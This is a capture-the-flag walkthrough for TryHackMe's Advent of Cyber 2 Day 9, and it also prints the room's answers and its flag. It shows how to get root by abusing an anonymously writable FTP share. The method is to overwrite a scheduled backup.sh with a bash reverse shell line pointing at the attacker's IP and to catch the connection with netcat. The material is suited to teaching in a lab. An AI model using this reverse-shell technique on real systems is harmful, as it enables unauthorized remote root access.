# _**adventofcyber2 Day 9 (FTP +Netcat)**_

    https://tryhackme.com/room/adventofcyber2

`First do FTP to the {machine IP}`

    ftp {machine IP}

`Name :anonymous`

![img.png](Images/img.png)

--------------------------------------------------------
![img_1.png](Images/img_1.png)

`on ftp you can find public directory which has data access`

![img_2.png](Images/img_2.png)

![img_3.png](Images/img_3.png)

    public

--------------------------------------------------------
`let dig in into public directory`
`there you can find two files `

![img_4.png](Images/img_4.png)

`download both of it using command`

    get backup.sh 
    get shoppinglist.txt

`Now let's see our tun0 ip using command`
    
    ifconfig

`copy that tun0 ip and now edit the backup.sh file with reverse shell command`

    bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1

`replace Your_TryHackMe_IP with you tun0 ip`

![img_5.png](Images/img_5.png)

`now listen on port 4444 with netcat command:`

    nc -nvlp 4444

`now on ftp /public directory `
`upload the backup.sh edited file using command`

    put backup.sh

`note you have to be on same directory that you have stored backup.sh edited file before ftp connection`

`now you will get root reverse shell connection on your netcat terminal`

![img_6.png](Images/img_6.png)

--------------------------------------------------------
`let's answers all the questions now`

![img_7.png](Images/img_7.png)

`yoo! easy right`

-----------------------------------------------------------
![img_8.png](Images/img_8.png)

`remember we had downloaded shoppinglist.txt file along with backup.sh`
`time to see what's inside it `

![img_9.png](Images/img_9.png)

`yoo we got our answer`

![img_10.png](Images/img_10.png)

    The Polar Express

--------------------------------------------------------
![img_12.png](Images/img_12.png)

`yoo! we have reverse shell root connection right `

`let's see what's in there`

![img_13.png](Images/img_13.png)

`we got our answer again`

![img_14.png](Images/img_14.png)

    THM{even_you_can_be_santa}
----------------------------------------------------------
# _*Thank You*_

